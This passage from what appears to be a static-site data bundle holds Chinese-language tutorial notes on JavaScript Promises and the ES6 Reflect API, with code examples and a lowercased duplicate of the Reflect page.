第三，当处于pending状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成）。\n\n\n# 使用\n\n- promise 构造函数接受一个函数作为参数，该函数的两个参数分别是 resolve 和 reject 。它们是两个函数，由 javascript 引擎提供，不用自己部署。 resolve 函数的作用是，将 promise 对象的状态从“未完成”变为“成功”（即从 pending 变为 resolved ），在异步操作成功时调用，并将异步操作的结果，作为参数传递出去；\n\nreject 函数的作用是，将 promise 对象的状态从“未完成”变为“失败”（即从 pending 变为 rejected ），在异步操作失败时调用，并将异步操作报出的错误，作为参数传递出去。\n\nconst promise = new promise(function(resolve, reject) {\n    // ... some code\n\n    if ( /* 异步操作成功 */ ) {\n        resolve(value);\n    } else {\n        reject(error);\n    }\n});\n\n\n- promise 实例生成以后，可以用 then 方法分别指定 resolved 状态和 rejected 状态的回调函数。\n\npromise.then(function(value) {\n    // resolved时调用\n    // success\n}, function(error) {\n    // rejected时调用\n    // failure\n});\n\n\nnew promise(function(resolve, reject) {\n\n        // resolve :函数执行成功调用，  调用之后会执行 then 方法\n        // reject ：当函数出现错误，  调用之后会执行 catch 方法\n\n        resolve(data)\n\n    })\n    .then(function(data) {\n        // data 可接收上次resolve发送的数据\n        return new promise(function(resolve, reject) {\n            resolve(data2)\n        })\n    })\n    .then(function(data2) {\n        //data2 接收上次return的数据\n    })\n    .catch(function() {\n        // 当请求出错时，会触发catch方法\n    })\n    .finally(function() {\n        // 无论函数执行结果如何都会执行 finally函数\n    })\n\n\n\n# promise 对象方法\n\n\n# then 方法：\n\npromise异步函数结束之后，调用then方法\n\n\n# catch 方法：\n\n当promise 异步函数 出现错误，会调用catch方法\n\n\n# finally 方法：\n\n无论成功 失败都会执行 finally 方法\n\n\n# promise.all 方法\n\n可以将多个promise对象包装成一个新的 promise 实例。 (并行)\n\n * promise.all方法接受一个数组作为参数，参数必须都是 promise 对象\n * 只有 参数 的状态都变成fulfilled，promise.all 对象的结果才为fulfilled\n * promise.all 对象可以接收每个 参数的返回值\n\npromise.all([p1, p2]).then(([end1, end2]) => {\n    console.log("全部已完成")\n}).catch(() => {});\n\n\n\n# promise.race 方法\n\n可以将多个promise对象包装成一个新的 promise 实例。\n\n * promise.race方法接受一个数组作为参数，参数必须都是 promise 对象\n * 只要参数之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的 promise 实例的返回值，就传递给p的回调函数\n\n\n# promise.resolve 方法\n\n将任意数据变为变为 promise 对象，如果其已经时promise对象，则无任何操作。',charsets:{cjk:!0}},{title:"Reflect",frontmatter:{},regularPath:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/Reflect.html",relativePath:"Javascript/Javascript数据处理/Reflect.md",key:"v-5b2f0866",path:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/Reflect.html",headers:[{level:2,title:"Reflect概述",slug:"reflect概述",normalizedTitle:"reflect概述",charIndex:14},{level:2,title:"静态方法",slug:"静态方法",normalizedTitle:"静态方法",charIndex:1280},{level:3,title:"Reflect.get(target, name, receiver)",slug:"reflect-get-target-name-receiver",normalizedTitle:"reflect.get(target, name, receiver)",charIndex:1368},{level:3,title:"Reflect.set(target, name, value, receiver)",slug:"reflect-set-target-name-value-receiver",normalizedTitle:"reflect.set(target, name, value, receiver)",charIndex:1080},{level:3,title:"Reflect.has(obj, name)",slug:"reflect-has-obj-name",normalizedTitle:"reflect.has(obj, name)",charIndex:684},{level:3,title:"Reflect.deleteProperty(obj, name)",slug:"reflect-deleteproperty-obj-name",normalizedTitle:"reflect.deleteproperty(obj, name)",charIndex:707},{level:3,title:"Reflect.construct(target, args)",slug:"reflect-construct-target-args",normalizedTitle:"reflect.construct(target, args)",charIndex:4365},{level:3,title:"Reflect.getPrototypeOf(obj)",slug:"reflect-getprototypeof-obj",normalizedTitle:"reflect.getprototypeof(obj)",charIndex:4703},{level:3,title:"Reflect.setPrototypeOf(obj, newProto)",slug:"reflect-setprototypeof-obj-newproto",normalizedTitle:"reflect.setprototypeof(obj, newproto)",charIndex:5202},{level:3,title:"Reflect.apply(func, thisArg, args)",slug:"reflect-apply-func-thisarg-args",normalizedTitle:"reflect.apply(func, thisarg, args)",charIndex:6135},{level:3,title:"Reflect.defineProperty(target, propertyKey, attributes)",slug:"reflect-defineproperty-target-propertykey-attributes",normalizedTitle:"reflect.defineproperty(target, propertykey, attributes)",charIndex:6794},{level:3,title:"Reflect.getOwnPropertyDescriptor(target, propertyKey)",slug:"reflect-getownpropertydescriptor-target-propertykey",normalizedTitle:"reflect.getownpropertydescriptor(target, propertykey)",charIndex:7645},{level:3,title:"Reflect.isExtensible (target)",slug:"reflect-isextensible-target",normalizedTitle:"reflect.isextensible (target)",charIndex:8275},{level:3,title:"Reflect.preventExtensions(target)",slug:"reflect-preventextensions-target",normalizedTitle:"reflect.preventextensions(target)",charIndex:8639},{level:3,title:"Reflect.ownKeys (target)",slug:"reflect-ownkeys-target",normalizedTitle:"reflect.ownkeys (target)",charIndex:9124}],headersStr:"Reflect概述 静态方法 Reflect.get(target, name, receiver) Reflect.set(target, name, value, receiver) Reflect.has(obj, name) Reflect.deleteProperty(obj, name) Reflect.construct(target, args) Reflect.getPrototypeOf(obj) Reflect.setPrototypeOf(obj, newProto) Reflect.apply(func, thisArg, args) Reflect.defineProperty(target, propertyKey, attributes) Reflect.getOwnPropertyDescriptor(target, propertyKey) Reflect.isExtensible (target) Reflect.preventExtensions(target) Reflect.ownKeys (target)",content:"# Reflect\n\n\n# Reflect概述\n\n> Reflect 对象与 Proxy 对象一样，也是 ES6 为了操作对象而提供的新 API。\n\n** Reflect 对象的设计目的有这样几个。**\n\n * 将Object对象的一些明显属于语言内部的方法（比如Object.defineProperty），放到Reflect对象上。现阶段，某些方法同时在Object和Reflect对象上部署，未来的新方法将只部署在Reflect对象上。也就是说，从Reflect对象上可以拿到语言内部的方法。\n\n * 修改某些Object方法的返回结果，让其变得更合理。比如，Object.defineProperty(obj, name, desc)在无法定义属性时，会抛出一个错误，而Reflect.defineProperty(obj, name, desc)则会返回false。\n\n// 老写法\ntry {\n    Object.defineProperty(target, property, attributes);\n    // success\n} catch (e) {\n    // failure\n}\n\n// 新写法\nif (Reflect.defineProperty(target, property, attributes)) {\n    // success\n} else {\n    // failure\n}\n\n\n * 让Object操作都变成函数行为。某些Object操作是命令式，比如name in obj和delete obj[name]，而Reflect.has(obj, name)和Reflect.deleteProperty(obj, name)让它们变成了函数行为。\n\n// 老写法\n'assign' in Object // true\n\n// 新写法\nReflect.has(Object, 'assign') // true\n\n\n * Reflect对象的方法与Proxy对象的方法一一对应，只要是Proxy对象的方法，就能在Reflect对象上找到对应的方法。这就让Proxy对象可以方便地调用对应的Reflect方法，完成默认行为，作为修改行为的基础。也就是说，不管Proxy怎么修改默认行为，你总可以在Reflect上获取默认行为。\n\nProxy(target, {\n    set: function(target, name, value, receiver) {\n        var success = Reflect.set(target, name, value, receiver);\n        if (success) {\n            console.log('property ' + name + ' on ' + target + ' set to ' + value);\n        }\n        return success;\n    }\n});\n\n\n\n# 静态方法\n\n> Reflect 对象一共有 13 个静态方法。 大部分与 Object 对象的同名方法的作用都是相同的，而且它与 Proxy 对象的方法是一一对应的。\n\n\n# Reflect.get(target, name, receiver)\n\n> Reflect.get 方法查找并返回 target 对象的 name 属性，如果没有该属性，则返回 undefined 。\n\nvar myObject = {\n    foo: 1,\n    bar: 2,\n    get baz() {\n        return this.foo + this.bar;\n    },\n}\n\nReflect.get(myObject, 'foo') // 1\nReflect.get(myObject, 'bar') // 2\nReflect.get(myObject, 'baz') // 3\n\n\n如果name属性部署了读取函数（getter），则读取函数的this绑定receiver。\n\nvar myObject = {\n    foo: 1,\n    bar: 2,\n    get baz() {\n        return this.foo + this.bar;\n    },\n};\n\nvar myReceiverObject = {\n    foo: 4,\n    bar: 4,\n};\n\nReflect.get(myObject, 'baz', myReceiverObject) // 8\n\n// 如果第一个参数不是对象，Reflect.get方法会报错。\nReflect.get(1, 'foo') // 报错\nReflect.get(false, 'foo') // 报错\n\n\n\n# Reflect.set(target, name, value, receiver)\n\n> Reflect.set 方法设置 target 对象的 name 属性等于 value 。\n\nvar myObject = {\n    foo: 1,\n    set bar(value) {\n        return this.foo = value;\n    },\n}\n\nmyObject.foo // 1\n\nReflect.set(myObject, 'foo', 2);\nmyObject.foo // 2\n\nReflect.set(myObject, 'bar', 3)\nmyObject.foo // 3\n\n\n如果name属性设置了赋值函数，则赋值函数的this绑定receiver\n\nvar myObject = {\n    foo: 4,\n    set bar(value) {\n        return this.foo = value;\n    },\n};\n\nvar myReceiverObject = {\n    foo: 0,\n};\n\nReflect.set(myObject, 'bar', 1, myReceiverObject);\nmyObject.foo // 4\nmyReceiverObject.foo // 1\n\n\nWARNING\n\n注意，如果 Proxy 对象和 Reflect 对象联合使用，前者拦截赋值操作，后者完成赋值的默认行为，而且传入了 receiver ，那么 Reflect.set 会触发 Proxy.defineProperty 拦截。\n\nlet p = {\n    a: 'a'\n};\n\nlet handler = {\n    set(target, key, value, receiver) {\n        console.log('set');\n        Reflect.set(target, key, value, receiver)\n    },\n    defineProperty(target, key, attribute) {\n        console.log('defineProperty');\n        Reflect.defineProperty(target, key, attribute);\n    }\n};\n\nlet obj = new Proxy(p, handler);\nobj.a = 'A';\n// set\n// defineProperty\n\n// Proxy.set拦截里面使用了Reflect.set，而且传入了receiver，导致触发Proxy.defineProperty拦截。这是因为Proxy.set的receiver参数总是指向当前的 Proxy实例（即上例的obj），而Reflect.set一旦传入receiver，就会将属性赋值到receiver上面（即obj），导致触发defineProperty拦截。如果Reflect.set没有传入receiver，那么就不会触发defineProperty拦截\n\nlet p = {\n    a: 'a'\n};\n\nlet handler = {\n    set(target, key, value, receiver) {\n        console.log('set');\n        Reflect.set(target, key, value)\n    },\n    defineProperty(target, key, attribute) {\n        console.log('defineProperty');\n        Reflect.defineProperty(target, key, attribute);\n    }\n};\n\nlet obj = new Proxy(p, handler);\nobj.a = 'A';\n// set\n\n// 如果第一个参数不是对象，Reflect.set会报错。\n\nReflect.set(1, 'foo', {}) // 报错\nReflect.set(false, 'foo', {}) // 报错\n\n\n\n# Reflect.has(obj, name)\n\n> Reflect.has 方法对应 name in obj 里面的 in 运算符。\n\n如果Reflect.has()方法的第一个参数不是对象，会报错。\n\nvar myObject = {\n    foo: 1,\n};\n\n// 旧写法\n'foo' in myObject // true\n\n// 新写法\nReflect.has(myObject, 'foo') // true\n\n\n\n# Reflect.deleteProperty(obj, name)\n\n> Reflect.deleteProperty 方法等同于 delete obj[name] ，用于删除对象的属性。\n\nconst myObj = {\n    foo: 'bar'\n};\n\n// 旧写法\ndelete myObj.foo;\n\n// 新写法\nReflect.deleteProperty(myObj, 'foo');\n// 该方法返回一个布尔值。如果删除成功，或者被删除的属性不存在，返回true；删除失败，被删除的属性依然存在，返回false。\n\n\n如果Reflect.deleteProperty()方法的第一个参数不是对象，会报错。\n\n\n# Reflect.construct(target, args)\n\n> Reflect.construct 方法等同于 new target(...args) ，这提供了一种不使用 new ，来调用构造函数的方法。\n\nfunction Greeting(name) {\n    this.name = name;\n}\n\n// new 的写法\nconst instance = new Greeting('张三');\n\n// Reflect.construct 的写法\nconst instance = Reflect.construct(Greeting, ['张三']);\n\n\n** 如果Reflect.construct()方法的第一个参数不是函数，会报错。 **\n\n\n# Reflect.getPrototypeOf(obj)\n\nReflect.getPrototypeOf 方法用于读取对象的 __proto__ 属性，对应 Object.getPrototypeOf(obj) 。\n\nconst myObj = new FancyThing();\n\n// 旧写法\nObject.getPrototypeOf(myObj) === FancyThing.prototype;\n\n// 新写法\nReflect.getPrototypeOf(myObj) === FancyThing.prototype;\n\n\nReflect.getPrototypeOf 和 Object.getPrototypeOf 的一个区别是，如果参数不是对象， Object.getPrototypeOf 会将这个参数转为对象，然后再运行，而 Reflect.getPrototypeOf 会报错。\n\nObject.getPrototypeOf(1) // Number {[[PrimitiveValue]]: 0}\nReflect.getPrototypeOf(1) // 报错\n\n\n\n# Reflect.setPrototypeOf(obj, newProto)\n\n> Reflect.setPrototypeOf 方法用于设置目标对象的原型（prototype），对应 Object.setPrototypeOf(obj, newProto) 方法。它返回一个布尔值，表示是否设置成功。\n\nconst myObj = {};\n\n// 旧写法\nObject.setPrototypeOf(myObj, Array.prototype);\n\n// 新写法\nReflect.setPrototypeOf(myObj, Array.prototype);\n\nmyObj.length // 0\n\n\n如果无法设置目标对象的原型（比如，目标对象禁止扩展），Reflect.setPrototypeOf方法返回false。\n\nReflect.setPrototypeOf({}, null)\n// true\nReflect.setPrototypeOf(Object.freeze({}), null)\n// false\n\n\n如果第一个参数不是对象， Object.setPrototypeOf 会返回第一个参数本身，而 Reflect.setPrototypeOf 会报错。\n\nObject.setPrototypeOf(1, {})\n// 1\n\nReflect.setPrototypeOf(1, {})\n// TypeError: Reflect.setPrototypeOf called on non-object\n\n\n如果第一个参数是undefined或null，Object.setPrototypeOf和Reflect.setPrototypeOf都会报错。\n\nObject.setPrototypeOf(null, {})\n// TypeError: Object.setPrototypeOf called on null or undefined\n\nReflect.setPrototypeOf(null, {})\n// TypeError: Reflect.setPrototypeOf called on non-object \n\n\n\n# Reflect.apply(func, thisArg, args)\n\n> Reflect.apply 方法等同于 Function.prototype.apply.call(func, thisArg, args) ，用于绑定 this 对象后执行给定函数。\n\n一般来说，如果要绑定一个函数的 this 对象，可以这样写 fn.apply(obj, args) ，但是如果函数定义了自己的 apply 方法，就只能写成 Function.prototype.apply.call(fn, obj, args) ，采用 Reflect 对象可以简化这种操作。\n\nconst ages = [11, 33, 12, 54, 18, 96];\n\n// 旧写法\nconst youngest = Math.min.apply(Math, ages);\nconst oldest = Math.max.apply(Math, ages);\nconst type = Object.prototype.toString.call(youngest);\n\n// 新写法\nconst youngest = Reflect.apply(Math.min, Math, ages);\nconst oldest = Reflect.apply(Math.max, Math, ages);\nconst type = Reflect.apply(Object.prototype.toString, youngest, []);\n\n\n\n# Reflect.defineProperty(target, propertyKey, attributes)\n\n> Reflect.defineProperty 方法基本等同于 Object.defineProperty ，用来为对象定义属性。未来，后者会被逐渐废除，请从现在开始就使用 Reflect.defineProperty 代替它。\n\nfunction MyDate() {\n    /*…*/\n}\n\n// 旧写法\nObject.defineProperty(MyDate, 'now', {\n    value: () => Date.now()\n});\n\n// 新写法\nReflect.defineProperty(MyDate, 'now', {\n    value: () => Date.now()\n});\n\n\n如果 Reflect.defineProperty 的第一个参数不是对象，就会抛出错误，比如 Reflect.defineProperty(1, 'foo') 。\n\n这个方法可以与Proxy.defineProperty配合使用。\n\nconst p = new Proxy({}, {\n    defineProperty(target, prop, descriptor) {\n        console.log(descriptor);\n        return Reflect.defineProperty(target, prop, descriptor);\n    }\n});\n\np.foo = 'bar';\n// {value: \"bar\", writable: true, enumerable: true, configurable: true}\n\np.foo // \"bar\"\n// 上面代码中，`Proxy.defineProperty`对属性赋值设置了拦截，然后使用`Reflect.defineProperty`完成了赋值。\n\n\n\n# Reflect.getOwnPropertyDescriptor(target, propertyKey)\n\n> Reflect.getOwnPropertyDescriptor 基本等同于 Object.getOwnPropertyDescriptor ，用于得到指定属性的描述对象，将来会替代掉后者。\n\nvar myObject = {};\nObject.defineProperty(myObject, 'hidden', {\n    value: true,\n    enumerable: false,\n});\n\n// 旧写法\nvar theDescriptor = Object.getOwnPropertyDescriptor(myObject, 'hidden');\n\n// 新写法\nvar theDescriptor = Reflect.getOwnPropertyDescriptor(myObject, 'hidden');\n\n// Reflect.getOwnPropertyDescriptor和Object.getOwnPropertyDescriptor的一个区别是，如果第一个参数不是对象，Object.getOwnPropertyDescriptor(1, 'foo')不报错，返回undefined，而Reflect.getOwnPropertyDescriptor(1, 'foo')会抛出错误，表示参数非法。\n\n\n\n# Reflect.isExtensible (target)\n\n> Reflect.isExtensible 方法对应 Object.isExtensible ，返回一个布尔值，表示当前对象是否可扩展。\n\nconst myObject = {};\n\n// 旧写法\nObject.isExtensible(myObject) // true\n\n// 新写法\nReflect.isExtensible(myObject) // true\n\n\n如果参数不是对象，Object.isExtensible会返回false，因为非对象本来就是不可扩展的，而Reflect.isExtensible会报错。\n\nObject.isExtensible(1) // false\nReflect.isExtensible(1) // 报错\n\n\n\n# Reflect.preventExtensions(target)\n\n> Reflect.preventExtensions 对应 Object.preventExtensions 方法，用于让一个对象变为不可扩展。它返回一个布尔值，表示是否操作成功。\n\nvar myObject = {};\n\n// 旧写法\nObject.preventExtensions(myObject) // Object {}\n\n// 新写法\nReflect.preventExtensions(myObject) // true\n\n\n如果参数不是对象，Object.preventExtensions在 ES5 环境报错，在 ES6 环境返回传入的参数，而Reflect.preventExtensions会报错。\n\n// ES5 环境\nObject.preventExtensions(1) // 报错\n\n// ES6 环境\nObject.preventExtensions(1) // 1\n\n// 新写法\nReflect.preventExtensions(1) // 报错\n\n\n\n# Reflect.ownKeys (target)\n\n> Reflect.ownKeys 方法用于返回对象的所有属性，基本等同于 Object.getOwnPropertyNames 与 Object.getOwnPropertySymbols 之和。\n\nvar myObject = {\n    foo: 1,\n    bar: 2,\n    [Symbol.for('baz')]: 3,\n    [Symbol.for('bing')]: 4,\n};\n\n// 旧写法\nObject.getOwnPropertyNames(myObject)\n// ['foo', 'bar']\n\nObject.getOwnPropertySymbols(myObject)\n//[Symbol(baz), Symbol(bing)]\n\n// 新写法\nReflect.ownKeys(myObject)\n// ['foo', 'bar', Symbol(baz), Symbol(bing)]\n",normalizedContent:"# reflect\n\n\n# reflect概述\n\n> reflect 对象与 proxy 对象一样，也是 es6 为了操作对象而提供的新 api。\n\n** reflect 对象的设计目的有这样几个。**\n\n * 将object对象的一些明显属于语言内部的方法（比如object.defineproperty），放到reflect对象上。现阶段，某些方法同时在object和reflect对象上部署，未来的新方法将只部署在reflect对象上。也就是说，从reflect对象上可以拿到语言内部的方法。\n\n * 修改某些object方法的返回结果，让其变得更合理。比如，object.defineproperty(obj, name, desc)在无法定义属性时，会抛出一个错误，而reflect.defineproperty(obj, name, desc)则会返回false。\n\n// 老写法\ntry {\n    object.defineproperty(target, property, attributes);\n    // success\n} catch (e) {\n    // failure\n}\n\n// 新写法\nif (reflect.defineproperty(target, property, attributes)) {\n    // success\n} else {\n    // failure\n}\n\n\n * 让object操作都变成函数行为。某些object操作是命令式，比如name in obj和delete obj[name]，而reflect.has(obj, name)和reflect.deleteproperty(obj, name)让它们变成了函数行为。\n\n// 老写法\n'assign' in object // true\n\n// 新写法\nreflect.has(object, 'assign') // true\n\n\n * reflect对象的方法与proxy对象的方法一一对应，只要是proxy对象的方法，就能在reflect对象上找到对应的方法。这就让proxy对象可以方便地调用对应的reflect方法，完成默认行为，作为修改行为的基础。也就是说，不管proxy怎么修改默认行为，你总可以在reflect上获取默认行为。\n\nproxy(target, {\n    set: function(target, name, value, receiver) {\n        var success = reflect.set(target, name, value, receiver);\n        if (success) {\n            console.log('property ' + name + ' on ' + target + ' set to ' + value);\n        }\n        return success;\n    }\n});\n\n\n\n# 静态方法\n\n> reflect 对象一共有 13 个静态方法。 大部分与 object 对象的同名方法的作用都是相同的，而且它与 proxy 对象的方法是一一对应的。\n\n\n# reflect.get(target, name, receiver)\n\n> reflect.get 方法查找并返回 target 对象的 name 属性，如果没有该属性，则返回 undefined 。\n\nvar myobject = {\n    foo: 1,\n    bar: 2,\n    get baz() {\n        return this.foo + this.bar;\n    },\n}\n\nreflect.get(myobject, 'foo') // 1\nreflect.get(myobject, 'bar') // 2\nreflect.get(myobject, 'baz') // 3\n\n\n如果name属性部署了读取函数（getter），则读取函数的this绑定receiver。\n\nvar myobject = {\n    foo: 1,\n    bar: 2,\n    get baz() {\n        return this.foo + this.bar;\n    },\n};\n\nvar myreceiverobject = {\n    foo: 4,\n    bar: 4,\n};\n\nreflect.get(myobject, 'baz', myreceiverobject) // 8\n\n// 如果第一个参数不是对象，reflect.get方法会报错。\nreflect.get(1, 'foo') // 报错\nreflect.get(false, 'foo') // 报错\n\n\n\n# reflect.set(target, name, value, receiver)\n\n> reflect.set 方法设置 target 对象的 name 属性等于 value 。\n\nvar myobject = {\n    foo: 1,\n    set bar(value) {\n        return this.foo = value;\n    },\n}\n\nmyobject.foo // 1\n\nreflect.set(myobject, 'foo', 2);\nmyobject.foo // 2\n\nreflect.set(myobject, 'bar', 3)\nmyobject.foo // 3\n\n\n如果name属性设置了赋值函数，则赋值函数的this绑定receiver\n\nvar myobject = {\n    foo: 4,\n    set bar(value) {\n        return this.foo = value;\n    },\n};\n\nvar myreceiverobject = {\n    foo: 0,\n};\n\nreflect.set(myobject, 'bar', 1, myreceiverobject);\nmyobject.foo // 4\nmyreceiverobject.foo // 1\n\n\nwarning\n\n注意，如果 proxy 对象和 reflect 对象联合使用，前者拦截赋值操作，后者完成赋值的默认行为，而且传入了 receiver ，那么 reflect.set 会触发 proxy.defineproperty 拦截。\n\nlet p = {\n    a: 'a'\n};\n\nlet handler = {\n    set(target, key, value, receiver) {\n        console.log('set');\n        reflect.set(target, key, value, receiver)\n    },\n    defineproperty(target, key, attribute) {\n        console.log('defineproperty');\n        reflect.defineproperty(target, key, attribute);\n    }\n};\n\nlet obj = new proxy(p, handler);\nobj.a = 'a';\n// set\n// defineproperty\n\n// proxy.set拦截里面使用了reflect.set，而且传入了receiver，导致触发proxy.defineproperty拦截。这是因为proxy.set的receiver参数总是指向当前的 proxy实例（即上例的obj），而reflect.set一旦传入receiver，就会将属性赋值到receiver上面（即obj），导致触发defineproperty拦截。如果reflect.set没有传入receiver，那么就不会触发defineproperty拦截\n\nlet p = {\n    a: 'a'\n};\n\nlet handler = {\n    set(target, key, value, receiver) {\n        console.log('set');\n        reflect.set(target, key, value)\n    },\n    defineproperty(target, key, attribute) {\n        console.log('defineproperty');\n        reflect.defineproperty(target, key, attribute);\n    }\n};\n\nlet obj = new proxy(p, handler);\nobj.a = 'a';\n// set\n\n// 如果第一个参数不是对象，reflect.set会报错。\n\nreflect.set(1, 'foo', {}) // 报错\nreflect.set(false, 'foo', {}) // 报错\n\n\n\n# reflect.has(obj, name)\n\n> reflect.has 方法对应 name in obj 里面的 in 运算符。\n\n如果reflect.has()方法的第一个参数不是对象，会报错。\n\nvar myobject = {\n    foo: 1,\n};\n\n// 旧写法\n'foo' in myobject // true\n\n// 新写法\nreflect.has(myobject, 'foo') // true\n\n\n\n# reflect.deleteproperty(obj, name)\n\n> reflect.deleteproperty 方法等同于 delete obj[name] ，用于删除对象的属性。\n\nconst myobj = {\n    foo: 'bar'\n};\n\n// 旧写法\ndelete myobj.foo;\n\n// 新写法\nreflect.deleteproperty(myobj, 'foo');\n// 该方法返回一个布尔值。如果删除成功，或者被删除的属性不存在，返回true；删除失败，被删除的属性依然存在，返回false。\n\n\n如果reflect.deleteproperty()方法的第一个参数不是对象，会报错。\n\n\n# reflect.construct(target, args)\n\n> reflect.construct 方法等同于 new target(...args) ，这提供了一种不使用 new ，来调用构造函数的方法。\n\nfunction greeting(name) {\n    this.name = name;\n}\n\n// new 的写法\nconst instance = new greeting('张三');\n\n// reflect.construct 的写法\nconst instance = reflect.construct(greeting, ['张三']);\n\n\n** 如果reflect.construct()方法的第一个参数不是函数，会报错。 **\n\n\n# reflect.getprototypeof(obj)\n\nreflect.getprototypeof 方法用于读取对象的 __proto__ 属性，对应 object.getprototypeof(obj) 。\n\nconst myobj = new fancything();\n\n// 旧写法\nobject.getprototypeof(myobj) === fancything.prototype;\n\n// 新写法\nreflect.getprototypeof(myobj) === fancything.prototype;\n\n\nreflect.getprototypeof 和 object.getprototypeof 的一个区别是，如果参数不是对象， object.getprototypeof 会将这个参数转为对象，然后再运行，而 reflect.getprototypeof 会报错。\n\nobject.getprototypeof(1) // number {[[primitivevalue]]: 0}\nreflect.getprototypeof(1) // 报错\n\n\n\n# reflect.setprototypeof(obj, newproto)\n\n> reflect.setprototypeof 方法用于设置目标对象的原型（prototype），对应 object.setprototypeof(obj, newproto) 方法。它返回一个布尔值，表示是否设置成功。\n\nconst myobj = {};\n\n// 旧写法\nobject.setprototypeof(myobj, array.prototype);\n\n// 新写法\nreflect.setprototypeof(myobj, array.prototype);\n\nmyobj.length // 0\n\n\n如果无法设置目标对象的原型（比如，目标对象禁止扩展），reflect.setprototypeof方法返回false。\n\nreflect.setprototypeof({}, null)\n// true\nreflect.setprototypeof(object.freeze({}), null)\n// false\n\n\n如果第一个参数不是对象， object.setprototypeof 会返回第一个参数本身，而 reflect.setprototypeof 会报错。\n\nobject.setprototypeof(1, {})\n// 1\n\nreflect.setprototypeof(1, {})\n// typeerror: reflect.setprototypeof called on non-object\n\n\n如果第一个参数是undefined或null，object.setprototypeof和reflect.setprototypeof都会报错。\n\nobject.setprototypeof(null, {})\n// typeerror: object.setprototypeof called on null or undefined\n\nreflect.setprototypeof(null, {})\n// typeerror: reflect.setprototypeof called on non-object \n\n\n\n# reflect.apply(func, thisarg, args)\n\n> reflect.apply 方法等同于 function.prototype.apply.call(func, thisarg, args) ，用于绑定 this 对象后执行给定函数。\n\n一般来说，如果要绑定一个函数的 this 对象，可以这样写 fn.apply(obj, args) ，但是如果函数定义了自己的 apply 方法，就只能写成 function.prototype.apply.call(fn, obj, args) ，采用 reflect 对象可以简化这种操作。\n\nconst ages = [11, 33, 12, 54, 18, 96];\n\n// 旧写法\nconst youngest = math.min.apply(math, ages);\nconst oldest = math.max.apply(math, ages);\nconst type = object.prototype.tostring.call(youngest);\n\n// 新写法\nconst youngest = reflect.apply(math.min, math, ages);\nconst oldest = reflect.apply(math.max, math, ages);\nconst type = reflect.apply(object.prototype.tostring, youngest, []);\n\n\n\n# reflect.defineproperty(target, propertykey, attributes)\n\n> reflect.defineproperty 方法基本等同于 object.defineproperty ，用来为对象定义属性。未来，后者会被逐渐废除，请从现在开始就使用 reflect.defineproperty 代替它。\n\nfunction mydate() {\n    /*…*/\n}\n\n// 旧写法\nobject.defineproperty(mydate, 'now', {\n    value: () => date.now()\n});\n\n// 新写法\nreflect.defineproperty(mydate, 'now', {\n    value: () => date.now()\n});\n\n\n如果 reflect.defineproperty 的第一个参数不是对象，就会抛出错误，比如 reflect.defineproperty(1, 'foo') 。\n\n这个方法可以与proxy.defineproperty配合使用。\n\nconst p = new proxy({}, {\n    defineproperty(target, prop, descriptor) {\n        console.log(descriptor);\n        return reflect.defineproperty(target, prop, descriptor);\n    }\n});\n\np.foo = 'bar';\n// {value: \"bar\", writable: true, enumerable: true, configurable: true}\n\np.foo // \"bar\"\n// 上面代码中，`proxy.defineproperty`对属性赋值设置了拦截，然后使用`reflect.defineproperty`完成了赋值。\n\n\n\n# reflect.getownpropertydescriptor(target, propertykey)\n\n> reflect.getownpropertydescriptor 基本等同于 object.getownpropertydescriptor ，用于得到指定属性的描述对象，将来会替代掉后者。\n\nvar myobject = {};\nobject.defineproperty(myobject, 'hidden', {\n    value: true,\n    enumerable: false,\n});\n\n// 旧写法\nvar thedescriptor = object.getownpropertydescriptor(myobject, 'hidden');\n\n// 新写法\nvar thedescriptor = reflect.getownpropertydescriptor(myobject, 'hidden');\n\n// reflect.getownpropertydescriptor和object.getownpropertydescriptor的一个区别是，如果第一个参数不是对象，object.getownpropertydescriptor(1, 'foo')不报错，返回undefined，而reflect.getownpropertydescriptor(1, 'foo')会抛出错误，表示参数非法。\n\n\n\n# reflect.isextensible (target)\n\n> reflect.isextensible 方法对应 object.isextensible ，返回一个布尔值，表示当前对象是否可扩展。\n\nconst myobject = {};\n\n// 旧写法\nobject.isextensible(myobject) // true\n\n// 新写法\nreflect.isextensible(myobject) // true\n\n\n如果参数不是对象，object.isextensible会返回false，因为非对象本来就是不可扩展的，而reflect.isextensible会报错。\n\nobject.isextensible(1) // false\nreflect.isextensible(1) // 报错\n\n\n\n# reflect.preventextensions(target)\n\n> reflect.preventextensions 对应 object.preventextensions 方法，用于让一个对象变为不可扩展。它返回一个布尔值，表示是否操作成功。\n\nvar myobject = {};\n\n// 旧写法\nobject.preventextensions(myobject) // object {}\n\n// 新写法\nreflect.preventextensions(myobject) // true\n\n\n如果参数不是对象，object.preventextensions在 es5 环境报错，在 es6 环境返回传入的参数，而reflect.preventextensions会报错。\n\n// es5 环境\nobject.preventextensions(1) // 报错\n\n// es6 环境\nobject.preventextensions(1) // 1\n\n// 新写法\nreflect.preventextensions(1) // 报错\n\n\n\n# reflect.ownkeys (target)\n\n> reflect.ownkeys 方法用于返回对象的所有属性，基本等同于 object.getownpropertynames 与 object.getownpropertysymbols 之和。\n\nvar myobject = {\n    foo: 1,\n    bar: 2,\n    [symbol.for('baz')]: 3,\n    [symbol.for('bing')]: 4,\n};\n\n// 旧写法\nobject.getownpropertynames(myobject)\n// ['foo', 'bar']\n\nobject.getownpropertysymbols(myobject)\n//[symbol(baz), symbol(bing)]\n\n// 新写法\nreflect.ownkeys(myobject)\n// ['foo', 'bar', symbol(baz), symbol(bing)]\n",charsets:{cjk:!0}},{title:"async函数",frontmatter:{},regularPath:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/async%E5%87%BD%E6%95%B0.html",relativePath:"Javascript/Javascript数据处理/async函数.md",key:"v-75521d69",path:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/async%E5%87%BD%E6%95%B0.html",headers:[{level:2,title:"什么是async函数",slug:"什么是async函数",normalizedTitle:"什么是async函数",charIndex:14},{level:2,title:"async函数对比generator的优点",slug:"async函数对比generator的优点",normalizedTitle:"async函数对比generator的优点",charIndex:749},{level:2,title:"async 函数的用法",slug:"async-函数的用法",normalizedTitle:"async 